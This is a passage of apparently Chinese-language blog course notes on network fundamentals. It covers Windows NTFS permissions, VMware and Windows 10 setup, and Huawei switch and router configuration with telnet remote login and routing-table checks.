&#x3D;&gt;  属性  &#x3D;&gt;  安全  &#x3D;&gt;  编辑  &#x3D;&gt;  添加  &#x3D;&gt;  指定用户或组</p></li><li><p>确定后设置权限</p></li></ul><h3 id="权限累加"><a href="#权限累加" class="headerlink" title="权限累加"></a>权限累加</h3><p><strong>用户对文档的有效权限</strong></p><ul><li>等于用户的权限  +  用户所属各组的权限</li></ul><p><strong>累加权限示例</strong></p><ul><li>用户huangrong同时属于taohuadao和gaibang组</li></ul><p><img src="/../img/img_artical/net_sec/2.1.7.png" alt="2.1.7"></p><h3 id="权限的拒绝"><a href="#权限的拒绝" class="headerlink" title="权限的拒绝"></a>权限的拒绝</h3><p><strong>可以为文档配置拒绝权限</strong></p><ul><li>拒绝权限优先，能够实现“一票否决”</li></ul><p><strong>拒绝权限示例</strong></p><ul><li>用户huangrong同时属于taohuadao和gaibang组</li></ul><p><img src="/../img/img_artical/net_sec/2.1.8.png" alt="2.1.8"></p><h3 id="权限继承"><a href="#权限继承" class="headerlink" title="权限继承"></a>权限继承</h3><p><strong>新建文件和子目录自动继承上一级目录的权限</strong></p><h3 id="取消继承"><a href="#取消继承" class="headerlink" title="取消继承"></a>取消继承</h3><p><strong>放弃从上一级目录继承的权限</strong></p><ul><li>右击文件  &#x3D;&gt;  属性  &#x3D;&gt;  安全  &#x3D;&gt;  高级  &#x3D;&gt;  禁用继承  &#x3D;&gt;  在弹出的提示中选择第一个  &#x3D;&gt;  确定  &#x3D;&gt;  编辑  &#x3D;&gt;  选择普通用户  &#x3D;&gt;  取消完全控制的勾选仅留读权限  &#x3D;&gt;  确定</li></ul><h3 id="强制继承"><a href="#强制继承" class="headerlink" title="强制继承"></a>强制继承</h3><p><strong>使子目录及文档立即继承当前文件夹的权限</strong></p><ul><li>右击目录  &#x3D;&gt;  属性  &#x3D;&gt;  安全  &#x3D;&gt;  高级  &#x3D;&gt;  勾选禁用继承下的复选框  &#x3D;&gt;  是  &#x3D;&gt;  确定</li></ul><p><font color="#ff0000"><strong>注：下级取消继承后上级目录可以强制继承，上级目录强制继承后下级目录还可以再次取消继承</strong></font></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络应用基础4</title>
      <link href="/posts/netbase4.html"/>
      <url>/posts/netbase4.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络应用基础4"><a href="#网络应用基础4" class="headerlink" title="网络应用基础4"></a>网络应用基础4</h1><h2 id="Windows概述"><a href="#Windows概述" class="headerlink" title="Windows概述"></a>Windows概述</h2><h3 id="什么是操作系统"><a href="#什么是操作系统" class="headerlink" title="什么是操作系统"></a>什么是操作系统</h3><p><strong>Operation System，操作系统</strong></p><ul><li>是一套用来管理硬件与软件资源的程序</li><li>主要控制CPU处理器、内存、硬盘，操作文件系统的读取和写入</li><li>为用户提供一个与硬件&#x2F;软件交互的操作界面</li></ul><p><img src="/../img/img_artical/net_sec/1.4.1.png" alt="1.4.1"></p><h3 id="Windows系统分类"><a href="#Windows系统分类" class="headerlink" title="Windows系统分类"></a>Windows系统分类</h3><p><strong>适用于个人电脑</strong></p><ul><li>Windows 7&#x2F;8&#x2F;10&#x2F;11</li></ul><p><strong>适用于服务器</strong></p><ul><li>Windows Server 2008&#x2F;2012&#x2F;2016&#x2F;2019</li></ul><h3 id="Windows版本"><a href="#Windows版本" class="headerlink" title="Windows版本"></a>Windows版本</h3><p><strong>个人电脑系列</strong></p><ul><li>Windows 10 家庭版&#x2F;专业版&#x2F;企业版&#x2F;教育版</li></ul><p><strong>适用于服务器</strong></p><ul><li>Windows Server 2019 标准版&#x2F;数据中心版</li></ul><h3 id="选用Windows服务器的理由"><a href="#选用Windows服务器的理由" class="headerlink" title="选用Windows服务器的理由"></a>选用Windows服务器的理由</h3><ul><li>易操作</li><li>易部署</li><li>适合中小企业或局域网环境</li></ul><h2 id="虚拟化技术"><a href="#虚拟化技术" class="headerlink" title="虚拟化技术"></a>虚拟化技术</h2><h3 id="什么是虚拟化"><a href="#什么是虚拟化" class="headerlink" title="什么是虚拟化"></a>什么是虚拟化</h3><p><strong>通过软件技术来模拟更多的设备资源</strong></p><ul><li>1个物理设备&#x3D;&gt;n个虚拟设备</li></ul><p><img src="/../img/img_artical/net_sec/1.4.2.png" alt="1.4.2"></p><h3 id="虚拟化实现条件"><a href="#虚拟化实现条件" class="headerlink" title="虚拟化实现条件"></a>虚拟化实现条件</h3><p><strong>支持虚拟化的CPU处理器</strong></p><ul><li>Intel-VT、AMD-V</li></ul><p><strong>内存足够支撑运行多个虚拟机</strong></p><ul><li>建议不少于16GB</li></ul><p><strong>虚拟化平台软件</strong></p><h3 id="常见的虚拟化软件产品"><a href="#常见的虚拟化软件产品" class="headerlink" title="常见的虚拟化软件产品"></a>常见的虚拟化软件产品</h3><p><strong>主要厂商及产品</strong></p><table><thead><tr><th align="center">系列</th><th align="center">PC版</th><th align="center">企业版</th></tr></thead><tbody><tr><td align="center">VMware</td><td align="center">VMware Workstation</td><td align="center">VMware vSphere</td></tr><tr><td align="center">Microsoft</td><td align="center">VirtualPC</td><td align="center">Hyper-V</td></tr><tr><td align="center">RedHat</td><td align="center">KVM</td><td align="center">RHEV</td></tr><tr><td align="center">Oracle</td><td align="center">VM VirtualBox</td><td align="center">VM Server</td></tr></tbody></table><h3 id="安装VMware-Workstation"><a href="#安装VMware-Workstation" class="headerlink" title="安装VMware Workstation"></a>安装VMware Workstation</h3><p><strong>从VMware官网获取Workstation Pro安装文件</strong></p><ul><li><a href="https://www.vmware.com/cn.html">https://www.vmware.com/cn.html</a></li></ul><p><strong>双击安装文件，根据提示安装</strong></p><h3 id="创建新虚拟机"><a href="#创建新虚拟机" class="headerlink" title="创建新虚拟机"></a>创建新虚拟机</h3><ul><li><p>创建虚拟机安装目录（E:\虚拟机\Win10-1）</p></li><li><p>创建裸机</p></li><li><p>文件 &#x3D;&gt; 新建虚拟机 &#x3D;&gt; 自定义（高级）&#x3D;&gt; 下一步 &#x3D;&gt; 稍后安装操作系统 &#x3D;&gt; 下一步 &#x3D;&gt; 客户机操作系统 &#x3D;&gt; 选择Windows 10 X64 &#x3D;&gt; 下一步 &#x3D;&gt; 虚拟机名输入win10-1 &#x3D;&gt; 位置选择（E:\虚拟机\Win10-1）&#x3D;&gt; 下一步 &#x3D;&gt; 固件类型选择UEFI &#x3D;&gt; 下一步 &#x3D;&gt; 下一步 &#x3D;&gt; 输入内存2048M &#x3D;&gt; 下一步 &#x3D;&gt; 磁盘大小输入500G &#x3D;&gt; 将虚拟磁盘存储为单个文件 &#x3D;&gt; 下一步 &#x3D;&gt; 下一步 &#x3D;&gt; 完成</p></li></ul><h2 id="Win10系统安装"><a href="#Win10系统安装" class="headerlink" title="Win10系统安装"></a>Win10系统安装</h2><h3 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h3><p><strong>镜像光盘放光驱</strong></p><ul><li>双击CD&#x2F;DVD-浏览-选择系统镜像文件</li></ul><p><strong>Win10系统的硬件要求</strong></p><ul><li>CPU处理器：1.0Hhz或更快</li><li>启动内存：2GB（64位）</li><li>硬盘空间：不少于20GB（64位），建议100GB及以上</li></ul><h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><p><strong>点击启动按钮进入安装向导</strong></p><ul><li>出现如下提示，将鼠标点击到虚拟机内并按回车</li></ul><p><img src="/../img/img_artical/net_sec/1.4.3.png" alt="1.4.3"></p><p><strong>配置安装过程</strong></p><ul><li><p>下一步 &#x3D;&gt; 现在安装 &#x3D;&gt; 我接受许可条款 &#x3D;&gt; 下一步 &#x3D;&gt; 自定义 &#x3D;&gt; 新建 &#x3D;&gt; 输入102400MB &#x3D;&gt; 应用 &#x3D;&gt; 确定 &#x3D;&gt; 选择未分配的空间再点新建 &#x3D;&gt; 输入102400MB &#x3D;&gt; 应用 &#x3D;&gt; 选择第一个100G分区 &#x3D;&gt; 下一步 &#x3D;&gt; 提示正在安装windows &#x3D;&gt; 等待安装完自动重启</p></li><li><p>区域设置选择中国 &#x3D;&gt; 是 &#x3D;&gt; 键盘布局选择微软拼音 &#x3D;&gt; 是 &#x3D;&gt; 跳过 &#x3D;&gt; 改为域加入 &#x3D;&gt; 输入用户名及密码（123456）&#x3D;&gt; 下一步 &#x3D;&gt; 再输入密码 &#x3D;&gt; 下一步 &#x3D;&gt; 自定义安全问题 &#x3D;&gt; 下一步 &#x3D;&gt; 否 &#x3D;&gt; 隐私设置全部关闭 &#x3D;&gt; 接受 &#x3D;&gt; 等待进入桌面环境。</p></li></ul><h3 id="设备驱动"><a href="#设备驱动" class="headerlink" title="设备驱动"></a>设备驱动</h3><p><strong>什么是硬件驱动？</strong></p><ul><li>能够让计算机的硬件充分发挥硬件性能，使硬件能够正常工作，我们把这样的程序称为硬件驱动。</li></ul><p><strong>安装虚拟工具（VMware Tools）</strong></p><ul><li><p>虚拟机菜单-安装VMware Tools</p></li><li><p>打开资源管理器-点击光驱驱动器盘符-双击setup64-下一步-下一步-安装-完成-是</p></li><li><p>安装完VMwareTools后显示效果可全屏显示</p></li><li><p>物理机文件复制或拖拽到虚拟机</p></li><li><p>虚拟机安装虚拟工具相当于物理机安装硬件驱动程序</p></li></ul><h2 id="虚拟化高级应用"><a href="#虚拟化高级应用" class="headerlink" title="虚拟化高级应用"></a>虚拟化高级应用</h2><h3 id="虚拟机快照"><a href="#虚拟机快照" class="headerlink" title="虚拟机快照"></a>虚拟机快照</h3><ul><li><p>为虚拟机的不同时间点记录数据备份</p></li><li><p>需要时可用来快速恢复虚拟机（类似于玩游戏时候的存档读档）</p></li><li><p>操作：虚拟机菜单 &#x3D;&gt; 快照 &#x3D;&gt; 拍摄快照 &#x3D;&gt; 输入快照名及描述信息</p></li></ul><p><strong>建议关机后做虚拟机快照，关机快照稳定、节省磁盘空间</strong></p><h2 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h2><h3 id="配置IP地址-默认网关"><a href="#配置IP地址-默认网关" class="headerlink" title="配置IP地址&#x2F;默认网关"></a>配置IP地址&#x2F;默认网关</h3><p><strong>设置 &#x3D;&gt; 网络和Internet &#x3D;&gt; 更改适配器设置 &#x3D;&gt; 双击”Ethernet0” &#x3D;&gt; 属性 &#x3D;&gt; 双击”Internet协议版本4”</strong></p><p><img src="/../img/img_artical/net_sec/1.4.4.png" alt="1.4.4"></p><h3 id="IP地址配置方式"><a href="#IP地址配置方式" class="headerlink" title="IP地址配置方式"></a>IP地址配置方式</h3><p><strong>静态配置IP地址</strong></p><ul><li>需管理员手动配置、配置IP地址任务量大、容易错误及冲突，适用于网络规模小，一般服务器配置静态固定IP地址</li></ul><p><strong>动态配置IP地址</strong></p><ul><li>自动获取IP地址，需要有DHCP服务器的支持，降低网络地址配置任务量，避免手动输入错误及冲突的几率</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络应用基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络应用基础3</title>
      <link href="/posts/netbase3.html"/>
      <url>/posts/netbase3.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络应用基础3"><a href="#网络应用基础3" class="headerlink" title="网络应用基础3"></a>网络应用基础3</h1><h2 id="远程管理交换机"><a href="#远程管理交换机" class="headerlink" title="远程管理交换机"></a>远程管理交换机</h2><h3 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h3><p><strong>远程管理需要通过IP地址访问网络设备</strong></p><ul><li>交换机的端口默认无法配置IP地址</li><li>需要使用虚拟端口Vlanif 1</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">Vlanif 1                           //进入Vlanif 1虚拟接口</span></span><br><span class="line"><span class="attr">[SW1-Vlanif1]ip</span> <span class="string">address 192.168.1.1 24            //配置IP地址为192.168.1.1，子网掩码为24</span></span><br></pre></td></tr></table></figure><h3 id="配置远程登录密码"><a href="#配置远程登录密码" class="headerlink" title="配置远程登录密码"></a>配置远程登录密码</h3><p><strong>远程登录需要配置VTY接口</strong></p><ul><li><p>VTY是虚拟终端，是一种网络设备远程连接的方式</p></li><li><p>vty 0 4表示同时开启0-4五个会话，即可最多同时供五个用户进行连接</p></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[SW1]user-interface</span> <span class="string">vty 0 4                                //进入用户接口VTY</span></span><br><span class="line"><span class="attr">[SW1-ui-vty0-4]set</span> <span class="string">authentication password cipher 123456   //配置密码为密文123456</span></span><br><span class="line"><span class="attr">[SW1-ui-vty0-4]user</span> <span class="string">privilege level 15                     //设置用户权限为15</span></span><br></pre></td></tr></table></figure><p><strong>用户等级权限如下：</strong></p><ul><li>0 参观，ping、tracert、telnet、display、quit等</li><li>1 监控，reboot、reset、undo、debugging等</li><li>2 系统配置，所有配置命令（管理级配置命令除外）</li><li>3<del>15，所有命令（4</del>15用于精细化权限管理）</li></ul><h3 id="远程连接测试"><a href="#远程连接测试" class="headerlink" title="远程连接测试"></a>远程连接测试</h3><p><strong>需要支持telnet的客户端软件</strong></p><ul><li><p>第三方软件，如SecureCRT、Putty、Xshell等</p></li><li><p>路由器&#x2F;交换机自带telnet命令</p></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW2&gt;telnet</span> <span class="string">192.168.1.1                                     //telnet + 目标主机IP地址</span></span><br><span class="line"><span class="attr">Trying</span> <span class="string">192.168.1.1 ...</span></span><br><span class="line"><span class="attr">Press</span> <span class="string">CTRL+K to abort</span></span><br><span class="line"><span class="attr">Connected</span> <span class="string">to 192.168.1.1 ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">Login</span> <span class="string">authentication</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">Password</span>:                                                  <span class="string">//输入密码</span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">The max number of VTY users is 5, and the number</span></span><br><span class="line">      <span class="attr">of</span> <span class="string">current VTY users on line is 1.</span></span><br><span class="line">      <span class="attr">The</span> <span class="string">current login time is 2023-11-23 19:57:58.</span></span><br><span class="line"><span class="attr">&lt;SW1&gt;</span>                                                      <span class="string">//主机名已从SW2变为SW1</span></span><br></pre></td></tr></table></figure><h2 id="路由介绍"><a href="#路由介绍" class="headerlink" title="路由介绍"></a>路由介绍</h2><h3 id="什么是路由器"><a href="#什么是路由器" class="headerlink" title="什么是路由器"></a>什么是路由器</h3><p><strong>负责在不同网络之间转发数据的设备</strong></p><ul><li>路由器决定到达目标的路径</li><li>路由器也为直连网络的主机充当”网关”角色</li></ul><p><img src="/../img/img_artical/net_sec/1.3.1.png" alt="1.3.1"></p><p><strong>路由器是实现网络互连的核心设备</strong></p><h2 id="路由器工作原理"><a href="#路由器工作原理" class="headerlink" title="路由器工作原理"></a>路由器工作原理</h2><h3 id="路由器工作原理简述"><a href="#路由器工作原理简述" class="headerlink" title="路由器工作原理简述"></a>路由器工作原理简述</h3><p><strong>每台路由器维护一份路由表，路由表记录着：</strong></p><ul><li>要访问XX网段应从哪个接口发送数据</li><li>可到达的下一个路由器（主机）的地址</li></ul><p><strong>路由器如何工作？</strong></p><ul><li><p>路由器接收数据包</p></li><li><p>检查数据包中的目标IP</p></li><li><p>在路由表中查找与目标IP相匹配的路由条目</p></li><li><p>路由表中找到与目标IP相匹配的路由条目后，按照此条目所指的方向将数据转发出去</p></li></ul><p><img src="/../img/img_artical/net_sec/1.3.2.png" alt="1.3.2"></p><h2 id="路由表基本配置"><a href="#路由表基本配置" class="headerlink" title="路由表基本配置"></a>路由表基本配置</h2><h3 id="配置设备名、接口地址"><a href="#配置设备名、接口地址" class="headerlink" title="配置设备名、接口地址"></a>配置设备名、接口地址</h3><p><strong>配置设备名（sysname）</strong></p><p><strong>配置接口地址（ip address IP地址 子网掩码）</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;u</span> <span class="string">t m                                         //取消终端提示消息</span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">Current terminal monitor is off.                </span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;system-view</span>                                   <span class="string">//进入系统视图</span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[Huawei]sysname</span> <span class="string">R1                                    //将路由器改名为R1</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet 0/0/0                   //进入GE0/0/0端口</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.1.254 24  //配置IP地址为192.168.1.254 子网掩码为255.255.255.0</span></span><br></pre></td></tr></table></figure><h3 id="保存路由器配置"><a href="#保存路由器配置" class="headerlink" title="保存路由器配置"></a>保存路由器配置</h3><p><strong>保存路由器配置（save）</strong></p><ul><li>大多数通用操作与交换机配置相同</li></ul><p></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;R1&gt;save</span></span><br><span class="line">  <span class="attr">The</span> <span class="string">current configuration will be written to the device. </span></span><br><span class="line">  <span class="attr">Are</span> <span class="string">you sure to continue? (y/n)[n]:y                              //提示配置将被写入设备，是否继续，输入y继续</span></span><br><span class="line">  <span class="attr">It</span> <span class="string">will take several minutes to save configuration file, please wait.......</span></span><br><span class="line">  <span class="attr">Configuration</span> <span class="string">file had been saved successfully</span></span><br><span class="line">  <span class="attr">Note</span>: <span class="string">The configuration file will take effect after being activated</span></span><br><span class="line"><span class="attr">&lt;R1&gt;</span></span><br></pre></td></tr></table></figure><h2 id="直连路由"><a href="#直连路由" class="headerlink" title="直连路由"></a>直连路由</h2><h3 id="什么是直连路由"><a href="#什么是直连路由" class="headerlink" title="什么是直连路由"></a>什么是直连路由</h3><p><strong>直连路由是指路由器接口所连接的网络段</strong></p><h3 id="路由器组网示例"><a href="#路由器组网示例" class="headerlink" title="路由器组网示例"></a>路由器组网示例</h3><p><strong>多网段互连</strong></p><ul><li>教学部、市场部各自有独立网段，如何实现互连？</li></ul><p><img src="/../img/img_artical/net_sec/1.3.3.png" alt="1.3.3"></p><p><strong>PC1配置：</strong></p><p><img src="/../img/img_artical/net_sec/1.3.4.png" alt="1.3.4"></p><p><strong>PC2配置：</strong></p><p><img src="/../img/img_artical/net_sec/1.3.5.png" alt="1.3.5"></p><p><strong>PC3配置：</strong></p><p><img src="/../img/img_artical/net_sec/1.3.6.png" alt="1.3.6"></p><p><strong>PC4配置：</strong></p><p><img src="/../img/img_artical/net_sec/1.3.7.png" alt="1.3.7"></p><p><strong>路由器R1配置：</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;u</span> <span class="string">t m</span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">Current terminal monitor is off.</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[Huawei]sysname</span> <span class="string">R1</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet 0/0/0</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.2.254 24</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]interface</span> <span class="string">GigabitEthernet 0/0/1</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/1]ip</span> <span class="string">address 192.168.1.254 24</span></span><br></pre></td></tr></table></figure><p><strong>验证连通性：PC1 ping PC2、PC3、PC4</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">PC&gt;ping</span> <span class="string">192.168.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Ping</span> <span class="string">192.168.1.2: 32 data bytes, Press Ctrl_C to break</span></span><br><span class="line"><span class="attr">From</span> <span class="string">192.168.1.2: bytes=32 seq=1 ttl=128 time=47 ms</span></span><br><span class="line"><span class="attr">From</span> <span class="string">192.168.1.2: bytes=32 seq=2 ttl=128 time=31 ms</span></span><br><span class="line"><span class="attr">From</span> <span class="string">192.168.1.2: bytes=32 seq=3 ttl=128 time=31 ms</span></span><br><span class="line"></span><br><span class="line"><span class="attr">---</span> <span class="string">192.168.1.2 ping statistics ---</span></span><br><span class="line">  <span class="attr">3</span> <span class="string">packet(s) transmitted</span></span><br><span class="line">  <span class="attr">3</span> <span class="string">packet(s) received</span></span><br><span class="line">  <span class="attr">0.00%</span> <span class="string">packet loss</span></span><br><span class="line">  <span class="attr">round-trip</span> <span class="string">min/avg/max = 31/36/47 ms</span></span><br><span class="line"></span><br><span class="line"><span class="attr">PC&gt;ping</span> <span class="string">192.168.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Ping</span> <span class="string">192.168.2.1: 32 data bytes, Press Ctrl_C to break</span></span><br><span class="line"><span class="attr">Request</span> <span class="string">timeout!</span></span><br><span class="line"><span class="attr">Request</span> <span class="string">timeout!</span></span><br><span class="line"><span class="attr">From</span> <span class="string">192.168.2.1: bytes=32 seq=3 ttl=127 time=62 ms</span></span><br><span class="line"><span class="attr">From</span> <span class="string">192.168.2.1: bytes=32 seq=4 ttl=127 time=63 ms</span></span><br><span class="line"><span class="attr">From</span> <span class="string">192.168.2.1: bytes=32 seq=5 ttl=127 time=62 ms</span></span><br><span class="line"></span><br><span class="line"><span class="attr">---</span> <span class="string">192.168.2.1 ping statistics ---</span></span><br><span class="line">  <span class="attr">5</span> <span class="string">packet(s) transmitted</span></span><br><span class="line">  <span class="attr">3</span> <span class="string">packet(s) received</span></span><br><span class="line">  <span class="attr">40.00%</span> <span class="string">packet loss</span></span><br><span class="line">  <span class="attr">round-trip</span> <span class="string">min/avg/max = 0/62/63 ms</span></span><br><span class="line"></span><br><span class="line"><span class="attr">PC&gt;ping</span> <span class="string">192.168.2.2</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Ping</span> <span class="string">192.168.2.2: 32 data bytes, Press Ctrl_C to break</span></span><br><span class="line"><span class="attr">Request</span> <span class="string">timeout!</span></span><br><span class="line"><span class="attr">From</span> <span class="string">192.168.2.2: bytes=32 seq=2 ttl=127 time=47 ms</span></span><br><span class="line"><span class="attr">From</span> <span class="string">192.168.2.2: bytes=32 seq=3 ttl=127 time=62 ms</span></span><br><span class="line"></span><br><span class="line"><span class="attr">---</span> <span class="string">192.168.2.2 ping statistics ---</span></span><br><span class="line">  <span class="attr">3</span> <span class="string">packet(s) transmitted</span></span><br><span class="line">  <span class="attr">2</span> <span class="string">packet(s) received</span></span><br><span class="line">  <span class="attr">33.33%</span> <span class="string">packet loss</span></span><br><span class="line">  <span class="attr">round-trip</span> <span class="string">min/avg/max = 0/54/62 ms</span></span><br></pre></td></tr></table></figure><h3 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h3><p><strong>查看路由表 display ip routing-table</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]display</span> <span class="string">ip routing-table </span></span><br><span class="line"><span class="attr">Route</span> <span class="string">Flags: R - relay, D - download to fib</span></span><br><span class="line"><span class="attr">------------------------------------------------------------------------------</span></span><br><span class="line"><span class="attr">Routing</span> <span class="string">Tables: Public</span></span><br><span class="line">         <span class="attr">Destinations</span> : <span class="string">10       Routes : 10       </span></span><br><span class="line"></span><br><span class="line"><span class="attr">Destination/Mask</span>    <span class="string">Proto   Pre  Cost      Flags NextHop         Interface</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">127.0.0.0/8</span>   <span class="string">Direct  0    0           D   127.0.0.1       InLoopBack0</span></span><br><span class="line">      <span class="attr">127.0.0.1/32</span>  <span class="string">Direct  0    0           D   127.0.0.1       InLoopBack0</span></span><br><span class="line"><span class="attr">127.255.255.255/32</span>  <span class="string">Direct  0    0           D   127.0.0.1       InLoopBack0</span></span><br><span class="line">    <span class="attr">192.168.1.0/24</span>  <span class="string">Direct  0    0           D   192.168.1.254   GigabitEthernet0/0/1         </span></span><br><span class="line">    <span class="attr">//通往1.0网段找1.254地址，从0/0/1接口出去</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">192.168.1.254/32</span>  <span class="string">Direct  0    0           D   127.0.0.1       GigabitEthernet</span></span><br><span class="line"><span class="attr">0/0/1</span></span><br><span class="line">  <span class="attr">192.168.1.255/32</span>  <span class="string">Direct  0    0           D   127.0.0.1       GigabitEthernet</span></span><br><span class="line"><span class="attr">0/0/1</span></span><br><span class="line">    <span class="attr">192.168.2.0/24</span>  <span class="string">Direct  0    0           D   192.168.2.254   GigabitEthernet0/0/0        </span></span><br><span class="line">    <span class="attr">//通往2.0网段找2.254地址，从0/0/0接口出去</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">192.168.2.254/32</span>  <span class="string">Direct  0    0           D   127.0.0.1       GigabitEthernet</span></span><br><span class="line"><span class="attr">0/0/0</span></span><br><span class="line">  <span class="attr">192.168.2.255/32</span>  <span class="string">Direct  0    0           D   127.0.0.1       GigabitEthernet</span></span><br><span class="line"><span class="attr">0/0/0</span></span><br><span class="line"><span class="attr">255.255.255.255/32</span>  <span class="string">Direct  0    0           D   127.0.0.1       InLoopBack0</span></span><br></pre></td></tr></table></figure><h2 id="远程管理路由器"><a href="#远程管理路由器" class="headerlink" title="远程管理路由器"></a>远程管理路由器</h2><h3 id="配置远程登录"><a href="#配置远程登录" class="headerlink" title="配置远程登录"></a>配置远程登录</h3><p><strong>远程登录需要配置VTY接口</strong></p><ul><li><p>VTY是虚拟终端，是一种网络设备远程连接的方式</p></li><li><p>vty 0 4表示同时开启0-4五个会话，即可最多同时供五个用户进行连接</p></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]user-interface</span> <span class="string">vty 0 4                                //进入用户接口VTY</span></span><br><span class="line"><span class="attr">[R1-ui-vty0-4]set</span> <span class="string">authentication password cipher 123456   //配置密码为密文123456</span></span><br><span class="line"><span class="attr">[R1-ui-vty0-4]user</span> <span class="string">privilege level 15                     //设置用户权限为15</span></span><br></pre></td></tr></table></figure><p><strong>用户等级权限如下：</strong></p><ul><li>0 参观，ping、tracert、telnet、display、quit等</li><li>1 监控，reboot、reset、undo、debugging等</li><li>2 系统配置，所有配置命令（管理级配置命令除外）</li><li>3<del>15，所有命令（4</del>15用于精细化权限管理）</li></ul><h3 id="远程连接测试-1"><a 